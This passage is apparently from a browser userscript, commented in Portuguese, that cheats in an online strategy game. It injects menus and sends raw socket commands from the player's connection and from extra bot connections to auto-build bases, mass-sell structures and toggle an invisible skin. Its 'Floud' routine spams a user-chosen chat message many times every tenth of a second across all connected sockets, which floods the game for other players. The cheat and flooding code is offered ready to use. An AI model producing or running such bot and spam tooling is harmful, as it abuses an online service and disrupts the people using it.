             coamdnos: socket.emit("1", -1.27, 306, 1),
                 coamdnos: socket.emit("1", -1.67, 306, 1),
         coamdnos:         socket.emit("1", -1.47, 306, 1),
          coamdnos:        socket.emit("1", -2.29, 306, 1),
         coamdnos:         socket.emit("1", -0.85, 306, 1),
         coamdnos:         socket.emit("1", -0.43, 306, 1),
         coamdnos:         socket.emit("1", -2.71, 306, 1),
         coamdnos:         socket.emit("1", -2.91, 306, 1),
         coamdnos:         socket.emit("1", -0.23, 306, 1),
         coamdnos:         socket.emit("1", -0.03, 306, 1),
         coamdnos:         socket.emit("1", -3.11, 306, 1),
         coamdnos:         socket.emit("1", 2.97, 306, 1),
         coamdnos:         socket.emit("1", 0.17, 306, 1),
         coamdnos:         socket.emit("1", 2.77, 306, 1),
         coamdnos:         socket.emit("1", 0.37, 306, 1),
         coamdnos:         socket.emit("1", 0.57, 306, 1),
         coamdnos:         socket.emit("1", 2.57, 306, 1),
        coamdnos:          socket.emit("1", 2.37, 306, 1),
        coamdnos:          socket.emit("1", 0.77, 306, 1),
        coamdnos:          socket.emit("1", 0.97, 306, 1),
        coamdnos:          socket.emit("1", 2.17, 306, 1),
        coamdnos:          socket.emit("1", 1.97, 306, 1),
        coamdnos:          socket.emit("1", 1.17, 306, 1),
         coamdnos:          socket.emit("1", 1.37, 306, 1),
          coamdnos:          socket.emit("1", 1.77, 306, 1),
          coamdnos:         socket.emit("1",Math.PI*-1.5,306,1),
          coamdnos:         socket.emit("1", -1.7, 245.85, 1),
          coamdnos:       socket.emit("1", -1.45, 245.85, 1),
          coamdnos:         socket.emit("1", -1.96, 245.85, 1),
          coamdnos:          socket.emit("1", -1.19, 245.85, 1),
          coamdnos:       socket.emit("1", -0.94, 245.85, 1),
          coamdnos:         socket.emit("1", -2.21, 245.85, 1),
          coamdnos:        socket.emit("1", -2.46, 245.85, 1),
          coamdnos:        socket.emit("1", -0.69, 245.85, 1),
          coamdnos:        socket.emit("1", -2.71, 245.85, 1),
          coamdnos:        socket.emit("1", -0.44, 245.85, 1),
         coamdnos:       socket.emit("1", -2.96, 245.85, 1),
           coamdnos:       socket.emit("1", -0.19, 245.85, 1),
           coamdnos:       socket.emit("1", 3.07, 245.85, 1),
           coamdnos:       socket.emit("1", 0.06, 245.85, 1),
           coamdnos:       socket.emit("1", 2.82, 245.85, 1),
          coamdnos:        socket.emit("1", 0.31, 245.85, 1),
          coamdnos:        socket.emit("1", 2.57, 245.85, 1),
          coamdnos:        socket.emit("1", 0.57, 245.85, 1),
          coamdnos:        socket.emit("1", 2.32, 245.85, 1),
         coamdnos:         socket.emit("1", 0.82, 245.85, 1),
         coamdnos:         socket.emit("1", 1.07, 245.85, 1),
          coamdnos:        socket.emit("1", 2.07, 245.85, 1),
         coamdnos:         socket.emit("1", 1.32, 245.85, 1),
         coamdnos:         socket.emit("1", 1.82, 245.85, 1),
         coamdnos:         socket.emit("1",Math.PI*-1.5,245.85,1),
         coamdnos:         socket.emit("1", -1.91, 184.69, 1),
         coamdnos:         socket.emit("1", -1.23, 184.4, 1),
         coamdnos:         socket.emit("1", -2.25, 185.57, 1),
         coamdnos:         socket.emit("1", -0.89, 184.93, 1),
         coamdnos:         socket.emit("1", -2.58, 190.21, 1),
         coamdnos:         socket.emit("1", -0.56, 190.16, 1),
        coamdnos:          socket.emit("1", -2.9, 186.72, 1),
        coamdnos:          socket.emit("1", -0.24, 185.76, 1),
        coamdnos:          socket.emit("1", 3.05, 183.1, 1),
          coamdnos:        socket.emit("1", 0.09, 183.95, 1),
          coamdnos:        socket.emit("1", 0.42, 189.81, 1),
          coamdnos:        socket.emit("1", 2.72, 189.79, 1),
         coamdnos:         socket.emit("1", 0.74, 187.09, 1),
         coamdnos:         socket.emit("1", 2.4, 188, 1),
         coamdnos:         socket.emit("1", 2.07, 181, 1),
          coamdnos:        socket.emit("1", 1.08, 181.02, 1),
          coamdnos:        socket.emit("1", 1.735, 188.31, 1),
          coamdnos:        socket.emit("1", 1.41, 188.81, 1),
          coamdnos:        socket.emit("1",Math.PI*1.5,140,1),
           coamdnos:       socket.emit("1", -2.095, 130, 1),
        coamdnos:          socket.emit("1", -1.048, 130, 1),
        coamdnos:          socket.emit("1", -2.565, 130, 1),
        coamdnos:          socket.emit("1", -0.58, 130, 1),
        coamdnos:          socket.emit("1", -3.035, 130, 1),
       coamdnos:           socket.emit("1", -0.09, 130, 1),
        coamdnos:          socket.emit("1", 0.38, 130, 1),
         coamdnos:         socket.emit("1", 2.78, 130, 1),
       coamdnos:           socket.emit("1", 2.3, 130, 1),
         coamdnos:         socket.emit("1", 0.86, 130, 1),
          coamdnos:        socket.emit("1", 1.83, 130, 1),
           coamdnos:       socket.emit("1", 1.33, 130, 1)
         }]
    objwall(coamdnos)
        }
 
 
 
//AUTO BASE SALVA(CONSTROI AUTOMATICAMENTE UMA BASE SALVA E CARREGADA)
var ligautb = false;
window.autoBase=function(){
var autbs = document.getElementById("abs")
if(ligautb){
    autbs.innerText="Auto base: OFF"
ligautb=false;
clearInterval(autb)
}else{
     autbs.innerText="Auto base: ON"
ligautb=true;
window.autb=setInterval(function(){
loadedBase.forEach((unit) => {
socket.emit("1",unit.dir,unit.dst,unit.uPath[0])
})
 
    window.sockets.forEach(socket => {
        loadedBase.forEach((unit) => {
socket.emit("1",unit.dir,unit.dst,unit.uPath[0])
})
    })
},100)
}
}
 
 
 
//MENU 1
var headAppend=document.getElementsByTagName("head")[0],style=document.createElement("div");style.innerHTML="<style>#upgradeScriptCont,.buttonClass{background-color: rgba(40,40,40,.5);margin-left: 3px;border-radius:10px;pointer-events:all}#upgradeScriptCont { top: -175px; transition: 1s; margin-left: -23px; position: absolute; padding-left: 24px; margin-top: 9px; padding-top: 15px; width: 330px; height: 168px; font-family: arial; left: 54%; -webkit-text-stroke-width: 3px; -webkit-text-stroke-color: #0008ffab; border-top-width: medium; border-right-width: medium; border-bottom-width: medium; border-left-width: medium; border-style: double; border-color: #00f; background-color: rgb(75 0 255 / 17%);}#upgradeScriptCont:hover{top:0px}.buttonClass{color:#fff;padding:7px;height:19px;display:inline-block;cursor:pointer;font-size:15px}.hoverMessage{color: white;font-size: 12px;position: relative;left: 230px;bottom: -3px;pointer-events: none;}</style>",headAppend.appendChild(style);var contAppend=document.getElementById("gameUiContainer"),menuA=document.createElement("div");menuA.innerHTML="\n\
<div id=upgradeScriptCont>\n\
<div id=layer1>\n\
<div id=skin class=buttonClass onclick=skin()>Skin Invisivel: OFF</div>\n\
<div id=centra class=buttonClass onclick=centralizar()>Centralizar</div>\n\
</div><div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div id=floda class=buttonClass onclick=Floud()>Flood: OFF</div>\n\
<div id=afk class=buttonClass onclick=afke()>AFK: OFF</div>\n\
<div id=linkP class=buttonClass onclick=linksparty()>Link</div>\n\
</div><div id=layer4 style=margin-top:1px;margin-left:0px>\n\
<input id=numerodemqs_input type=range min=0.000001 max=15 value=>\n\
<div id=abs class=buttonClass onclick=autoBase()>Auto base: OFF</div>\n\
</div><div id=layer4 style=margin-top:1px;margin-left:0px>\n\
<div id=mudatema class=buttonClass onclick=temazoado()>Thema: <span id=theme1></span></div>\n\
</div><span id=Fps class=hoverMessage></span></div>",contAppend.insertBefore(menuA,contAppend.firstChild)
    window.themes=0
 
window.temazoado=function(){
    var spatema = document.getElementById("theme1")
if(themes==0){
themes=1
spatema.innerHTML="Dark Right"
    darkColor = "#1f1f1f"
    backgroundColor = "#000"
    outerColor = "#262626"
    indicatorColor = "#061071a8"
    turretColor = "#00ffe266"
    bulletColor = "#ff000099"
    redColor = "#004098a1"
    targetColor = "rgb(234 0 0 / 50%)"
}
else if(themes==1){
themes=2
spatema.innerHTML="Zuado"
    darkColor= "rgb(191 0 0 / 62%)"
    backgroundColor = "rgb(21 21 21 / 10%)"
    outerColor = "rgb(101 101 101 / 35%)"
    indicatorColor = "rgb(0 173 255 / 28%)"
    turretColor = "#175e7d7d"
    bulletColor = "#ffffff99"
    redColor = "rgb(255 0 0 / 28%)"
    targetColor = "rgb(234 0 0 / 50%)"
}else if(themes==2){
themes=0
spatema.innerHTML="White"
    darkColor= "rgb(144 2 2 / 65%)"
    backgroundColor = "#d2d2d2"
    outerColor = "#7d7d7d"
    indicatorColor = "rgb(224 2 2 / 65%)"
    turretColor = "#175e7d7d"
    bulletColor = "#ffffff99"
    redColor = "rgb(255 0 0 / 28%)"
    targetColor = "rgb(234 0 0 / 50%)"
}
}
    temazoado()
//TRANSFORMA TROPAS EM CIRCULOS
 
/*
window.atu=setInterval(function(){
if(units){
units.forEach((unit) => {
  if(unit.shape!=="circle" && unit.type === 1){
  unit.shape="circle"
  }
})
}
},10)
*/
 
 
//MENU2
var headAppend2=document.getElementsByTagName("head")[0],style2=document.createElement("div");style2.innerHTML="<style>#upgradeScriptCont2,.buttonClass{background-color: rgba(40,40,40,.5);margin-left: 3px;border-radius:10px;pointer-events:all}#upgradeScriptCont2 { top: -456px; transition: 1s; margin-left: -600px; position: absolute; padding-left: 24px; margin-top: 9px; padding-top: 15px; width: 835px; height: 420px; font-family: arial; left: 54%; -webkit-text-stroke-width: 3px; -webkit-text-stroke-color: #0008ffab; border-top-width: medium; border-right-width: medium; border-bottom-width: medium; border-left-width: medium; border-style: double; border-color: #00f; background-color: rgb(75 0 255 / 17%); }#upgradeScriptCont2:hover{top:0px}.buttonClass{color:#fff;padding:7px;height:19px;display:inline-block;cursor:pointer;font-size:15px}.hoverMessage{color: white;font-size: 12px;position: relative;left: 230px;bottom: 0px;pointer-events: none;}</style>",headAppend2.appendChild(style2);var contAppend2=document.getElementById("gameUiContainer"),menuA2=document.createElement("div");menuA2.innerHTML="\n\
<div id=upgradeScriptCont2>\n\
<div id=layer2>\n\
<div id=txtV onclick=()>Sell</div>\n\
<div class=buttonClass onclick=SellWall()>Sell Walls</div>\n\
<div class=buttonClass onclick=SellBoulder()>Sell Boulders</div>\n\
<div class=buttonClass onclick=SellSpikes()>Sell Spikes</div>\n\
<div class=buttonClass onclick=SellMicroGenerator()>Sell Micro Generators</div>\n\
<div class=buttonClass onclick=SellInner()>Sell Inner</div>\n\
<div class=buttonClass onclick=SellOuter()>Sell Outer</div>\n\
<div class=buttonClass onclick=SellHouse()>Sell Houses</div>\n\
<div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass onclick=SellGenerator()>Sell Generators</div>\n\
<div class=buttonClass onclick=SellPowerPlant()>Sell Power Plants</div>\n\
<div class=buttonClass onclick=SellArmory()>Sell Armory</div>\n\
<div class=buttonClass onclick=SellBarracks()>Sell Barracks</div>\n\
<div class=buttonClass onclick=SellGreaterBarracks()>Sell Greater Barracks</div>\n\
<div class=buttonClass onclick=SellTankFactory()>Sell Tank Factorys</div>\n\
<div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass onclick=SellSiegeFactory()>Sell Siege Factorys</div>\n\
<div class=buttonClass onclick=SellBlitzFactory()>Sell Blitz Factorys</div>\n\
<div class=buttonClass onclick=SellSniperTurret()>Sell Sniper Turrets</div>\n\
<div class=buttonClass onclick=SellSemiAutoSniper()>Sell Semi-Auto Snipers</div>\n\
<div class=buttonClass onclick=SellAntiTankGun()>Sell Anti Tank Guns</div>\n\
<div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass onclick=SellSimpleTurret()>Sell Simple Turrets</div>\n\
<div class=buttonClass onclick=SellRapidTurret()>Sell Rapid Turrets</div>\n\
<div class=buttonClass onclick=SellGatlinTurret()>Sell Gatlin Turrets</div>\n\
<div class=buttonClass onclick=SellRangedTurret()>Sell Ranged Turrets</div>\n\
<div class=buttonClass onclick=SellSpotterTurret()>Sell Spotter Turrets</div>\n\
<div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass onclick=SellObject()>Sell Object Listened</div>\n\
<div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div id=txtU onclick=()>Upgrades</div>\n\
<div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass onclick=UpgradeBoulder()>Upgrade Boulders</div>\n\
<div class=buttonClass onclick=UpgradeSpikes()>Upgrade Spikes</div>\n\
<div class=buttonClass onclick=UpgradeMicroGenerator()>Upgrade Micro Generators</div>\n\
<div class=buttonClass onclick=UpgradePowerPlant()>Upgrade Power Plants</div>\n\
<div class=buttonClass onclick=UpgradeGreaterBarracks1()>Upgrade Greater Barracks</div>\n\
<div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass onclick=UpgradeTankFactory()>Upgrade Tank Factorys</div>\n\
<div class=buttonClass onclick=UpgradeSiegeFactory()>Upgrade Siege Factorys</div>\n\
<div class=buttonClass onclick=UpgradeBlitzFactory()>Upgrade Blitz Factorys</div>\n\
<div class=buttonClass onclick=UpgradeSemiAutoSniper()>Upgrade Semi-Auto Snipers</div>\n\
<div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass onclick=UpgradeAntiTankGun()>Upgrade Anti Tank Guns</div>\n\
<div class=buttonClass onclick=UpgradeRapidTurret()>Upgrade Rapid Turrets</div>\n\
<div class=buttonClass onclick=UpgradeGatlinTurret()>Upgrade Gatlin Turrets</div>\n\
<div class=buttonClass onclick=UpgradeRangedTurret()>Upgrade Ranged Turrets</div>\n\
<div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass onclick=UpgradeSpotterTurret()>Upgrade Spotter Turrets</div>\n\
<div class=buttonClass onclick=tankarmory()>Upgrade Tank Armory</div>\n\
<div class=buttonClass onclick=(soldadoarmory(),soldadoarmorY())>Upgrade soldado Armory</div>\n\
</div></div></div></div></div></div></div></div></div>\n\
<div id=menuc>\n\
<div id=btnMenu onclick=()>Build</div>\n\
",contAppend2.insertBefore(menuA2,contAppend2.firstChild)
var css = document.createElement("style")
css.innerText = `
output {
  position: absolute;
  background-image: linear-gradient(#444444, #999999);
  width: 40px;
  height: 30px;
  text-align: center;
  color: white;
  border-radius: 10px;
  display: inline-block;
  font: bold 15px/30px Georgia;
  bottom: 175%;
  left: 0;
  margin-left: -1%;
}
output:after {
  content: "";
  position: absolute;
  width: 0;
  height: 0;
  border-top: 10px solid #999999;
  border-left: 5px solid transparent;
  border-right: 5px solid transparent;
  top: 100%;
  left: 50%;
  margin-left: -5px;
  margin-top: -1px;
}
form {
  position: relative;
  margin: -6px;
}
 
 
 
 #btnMenu {padding-left:16px;text-align:left;}
#menuc {
    -webkit-text-stroke-width: 3px;
    -webkit-text-stroke-color: #0008ffab;
    background-color: rgba(40, 40, 40, 0.5);
    font-family: '-webkit-pictograph';
    font-size: 20px;
    border-radius: 0px;
    color: #fff;
    width: 88px;
    height: 30px;
    margin-left: 400px;
    margin-top: 35px;
    border-bottom-right-radius: 10px;
    border-bottom-left-radius: 10px;
    border-top-width: medium;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
    border-style: double;
    border-color: #00f;
    background-color: rgb(75 0 255 / 17%);
}
 
`,document.head.appendChild(css)
 
//MENU 3
var headAppend=document.getElementsByTagName("head")[0],style=document.createElement("div");style.innerHTML="<style>#upgradeScriptCont3,.buttonClass{background-color: rgba(40,40,40,.5);margin-left: 3px;border-radius:10px;pointer-events:all}#upgradeScriptCont3 { top: -173px; transition: 1s; margin-left: -700px; position: absolute; padding-left: 24px; margin-top: 9px; padding-top: 15px; width: 330px; height: 165px; font-family: arial; left: 54%; -webkit-text-stroke-width: 3px; -webkit-text-stroke-color: #0008ffab; border-top-width: medium; border-right-width: medium; border-bottom-width: medium; border-left-width: medium; border-style: double; border-color: #00f; background-color: rgb(75 0 255 / 17%);}#upgradeScriptCont3:hover{top:0px}.buttonClass{color:#fff;padding:7px;height:19px;display:inline-block;cursor:pointer;font-size:15px}.hoverMessage{color: white;font-size: 12px;position: relative;left: 230px;bottom: -8px;pointer-events: none;}</style>",headAppend.appendChild(style);var contAppend=document.getElementById("gameUiContainer"),menuA=document.createElement("div");menuA.innerHTML="\n\
<div id=upgradeScriptCont3>\n\
<div id=layer3>\n\
<div class=buttonClass>Copia: </div>                                  <span id=shar></span>\n\
<div class=buttonClass>Defend: </div>                                 <span id=def1></span>\n\
<div class=buttonClass>Defend Inteligente: </div>                     <span id=defia></span>\n\
</div><div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass>Commander Inteligente: </div>                  <span id=commandia></span>\n\
</div><div id=layer4 style=margin-top:7px;margin-left:0px>\n\
<div class=buttonClass>Full Power: </div>                             <span id=fullpow></span>\n\
</div></div>",contAppend.insertBefore(menuA,contAppend.firstChild)
 
function aa1(){
window.controlasss=setInterval(function(){
      document.getElementById("shar").innerHTML = cop;
      document.getElementById("def1").innerHTML = defe;
      document.getElementById("defia").innerHTML = defIA;
      document.getElementById("commandia").innerHTML = comanderIA;
      document.getElementById("fullpow").innerHTML = fulpower;
},600)
}
aa1()
 
 
 
 
 
 
var inputvar = document.getElementById("numerodemqs_input"),
  number_mqs = document.getElementById("resultado1");
inputvar.addEventListener("input", function() {
     outlineWidth = inputvar.value;
}, false);
 
 
 
//FLOOD
window.Floud=function(){
    var texto = document.getElementById("floda");
if(flod){
flod=false;
texto.innerText="Flood: OFF"
clearInterval(flod1)
}else{
    mensa = prompt("digite a mensagem")
flod=true;
texto.innerText="Flood: ON"
window.flod1=setInterval(function(){
    socket.emit("ch",mensa)
   socket.emit("ch",mensa)
socket.emit("ch",mensa)
 
window.sockets.forEach((socket)=>{
    socket.emit("ch",mensa)
   socket.emit("ch",mensa)
socket.emit("ch",mensa)
},true)
                socket.emit("ch",mensa)
   socket.emit("ch",mensa)
socket.emit("ch",mensa)
},99)
}
}
 
 
 
 
//VENDE E ATUALIZA
 
window.SellWall=()=>{
    for (var a = [], d = 0; d < units.length; ++d) {
        if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Wall'){
         a.push(units[d].id)
    socket.emit("3", a)
        }
    }
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
     for (var a = [], d = 0; d < units.length; ++d) {
        if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Wall'){
         a.push(units[d].id)
    socket.emit("3", a)
        }
     }
 
            })
 
        }
 
 
window.SellBoulder=()=>{
  for (var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Boulder'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
 
 
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
   for (var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Boulder'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
 
            })
 
        }
 
 
window.SellAntiTankGun=()=>{
 for (var a = [], d = 0; d < units.length; ++d){
     if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Anti Tank Gun'){
        a.push(units[d].id);
    socket.emit("3", a)
     }
}
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 
 for (var a = [], d = 0; d < units.length; ++d){
     if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Anti Tank Gun'){
        a.push(units[d].id);
    socket.emit("3", a)
     }
}
            })
 
        }
 
 
window.SellBoulder=()=>{
   for (var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Boulder'){
           a.push(units[d].id);
    socket.emit("3", a)
       }
   }
 
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 
   for (var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Boulder'){
           a.push(units[d].id);
    socket.emit("3", a)
       }
 
   }
            })
 
        }
 
 
window.dpk=()=>{
 for(i=-3.14;i<=3.14;i+=0.5233){socket.emit("1",i,132,3);}
for(i=-2.965;i<=3.14;i+=0.3488){socket.emit("1",i,243.85,3);}
for(i=-3.14;i<=3.14;i+=0.3488){socket.emit("1",i,194,2);}
for(i=-3.14;i<3.14;i+=0.216){socket.emit("1",i,1e3,1);}
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
for(i=-3.14;i<=3.14;i+=0.5233){socket.emit("1",i,132,3);}
for(i=-2.965;i<=3.14;i+=0.3488){socket.emit("1",i,243.85,3);}
for(i=-3.14;i<=3.14;i+=0.3488){socket.emit("1",i,194,2);}
for(i=-3.14;i<3.14;i+=0.216){socket.emit("1",i,1e3,1);}
            })
 
        }
 
window.SellSpikes=()=>{
   for (var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Spikes'){
           a.push(units[d].id);
    socket.emit("3", a)
       }
   }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
   for (var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Spikes'){
           a.push(units[d].id);
    socket.emit("3", a)
       }
   }
            })
 
        }
window.SellMicroGenerator=()=>{
    for (var a = [], d = 0; d < units.length; ++d){
        if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Micro Generator'){
            a.push(units[d].id);
    socket.emit("3", a)
        }
    }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
    for (var a = [], d = 0; d < units.length; ++d){
        if(units[d].type === 3 && getUnitFromPath(units[d].uPath).name === 'Micro Generator'){
            a.push(units[d].id);
    socket.emit("3", a)
        }
    }
            })
 
}
 
 
 
window.sellinner=()=>{
 for (var a = [], d = 0; d < units.length; ++d) {
        if (units[d].type === 0) {
            a.push(units[d].id)
            socket.emit("3", a)
        }
    }
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 for (var a = [], d = 0; d < units.length; ++d) {
        if (units[d].type === 0) {
            a.push(units[d].id)
             socket.emit("3", a)
        }
    }
            })
 
        }
 
window.SellOuter=()=>{
   for (var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 3 || units[d].type === 2){
           a.push(units[d].id);
    socket.emit("3", a)
       }
   }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
   for (var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 3 || units[d].type === 2){
           a.push(units[d].id);
    socket.emit("3", a)
       }
   }
            })
 
        }
 
window.SellHouse=()=>{
  for (var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'House'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for (var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'House'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
            })
 
        }
 
 
window.SellGenerator=()=>{
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Generator'){
     a.push(units[d].id);
    socket.emit("3", a);
      }
  }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Generator'){
     a.push(units[d].id);
    socket.emit("3", a);
      }
  }
            })
 
        }
 
 
window.SellPowerPlant=()=>{
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Power Plant'){
    a.push(units[d].id);
    socket.emit("3", a);
      }
  }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Power Plant'){
    a.push(units[d].id);
    socket.emit("3", a);
      }
  }
            })
 
        }
 
 
window.SellArmory=()=>{
   for(var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Armory'){
           a.push(units[d].id);
    socket.emit("3", a)
       }
   }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for(var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Armory'){
           a.push(units[d].id);
    socket.emit("3", a)
       }
   }
            })
 
        }
 
 
window.SellBarracks=()=>{
for(var a = [], d = 0; d < units.length; ++d){
    if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Barracks'){
        a.push(units[d].id);
    socket.emit("3", a)
    }
}
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
for(var a = [], d = 0; d < units.length; ++d){
    if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Barracks'){
        a.push(units[d].id);
    socket.emit("3", a)
    }
}
            })
 
        }
window.SellGreaterBarracks=()=>{
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Greater Barracks'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Greater Barracks'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
            })
 
        }
 
window.SellTankFactory=()=>{
 for(var a = [], d = 0; d < units.length; ++d){
     if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Tank Factory'){
         a.push(units[d].id);
    socket.emit("3", a)
     }
 }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 for(var a = [], d = 0; d < units.length; ++d){
     if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Tank Factory'){
         a.push(units[d].id);
    socket.emit("3", a)
     }
 }
            })
 
        }
 
window.SellSiegeFactory=()=>{
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Siege Factory'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Siege Factory'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
            })
 
        }
 
 
window.SellBlitzFactory=()=>{
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Blitz Factory'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 2 && getUnitFromPath(units[d].uPath).name === 'Blitz Factory'){
          a.push(units[d].id);
    socket.emit("3", a)
      }
  }
            })
 
        }
 
 
window.SellSniperTurret=()=>{
    for(var a = [], d = 0; d < units.length; ++d){
if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Sniper Turret'){
    a.push(units[d].id);
    socket.emit("3", a)
}
    }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
    for(var a = [], d = 0; d < units.length; ++d){
if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Sniper Turret'){
    a.push(units[d].id);
    socket.emit("3", a)
}
    }
            })
 
        }
 
window.SellSemiAutoSniper=()=>{
   for(var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Semi-Auto Sniper'){
    a.push(units[d].id);
    socket.emit("3", a)
       }
   }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
   for(var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Semi-Auto Sniper'){
    a.push(units[d].id);
    socket.emit("3", a)
       }
   }
            })
 
        }
 
window.SellSimpleTurret=()=>{
 for(var a = [], d = 0; d < units.length; ++d){
     if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Simple Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
     }
 }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 for(var a = [], d = 0; d < units.length; ++d){
     if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Simple Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
     }
 }
            })
 
        }
 
window.SellRapidTurret=()=>{
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Rapid Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
      }
  }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for(var a = [], d = 0; d < units.length; ++d){
      if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Rapid Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
      }
  }
            })
 
        }
 
window.SellGatlinTurret=()=>{
   for(var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Gatlin Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
       }
   }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
   for(var a = [], d = 0; d < units.length; ++d){
       if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Gatlin Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
       }
   }
            })
 
        }
 
 
window.SellRangedTurret=()=>{
  for(var a = [], d = 0; d < units.length; ++d){
    if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Ranged Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
    }
  }
